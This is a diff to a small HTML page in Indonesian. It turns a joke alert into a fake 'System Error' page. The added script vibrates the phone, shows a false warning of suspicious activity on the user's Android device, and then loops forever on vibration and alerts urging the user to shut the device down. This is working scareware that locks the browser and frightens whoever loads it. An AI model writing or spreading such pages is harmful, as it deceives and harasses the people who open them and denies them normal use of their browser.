@@ -2,15 +2,21 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Kejutan!</title>
+    <title>Sistem Error!</title>
 </head>
 <body>
     <script>
-        alert("Jangan panik, CUMAN TES NENTAL!");
+        function getarEkstrem() {
+            if (navigator.vibrate) {
+                navigator.vibrate(1000); 
+            }
+        }
+        getarEkstrem();
+        alert("PERINGATAN: Terdeteksi aktivitas mencurigakan pada sistem Android Anda!");
         while (true) {
-            alert("TES MENTAL BANG! Hahaha");
+            getarEkstrem();
+            alert("SISTEM ERROR! Segera matikan perangkat Anda!");
         }
     </script>
 </body>
 </html>
-
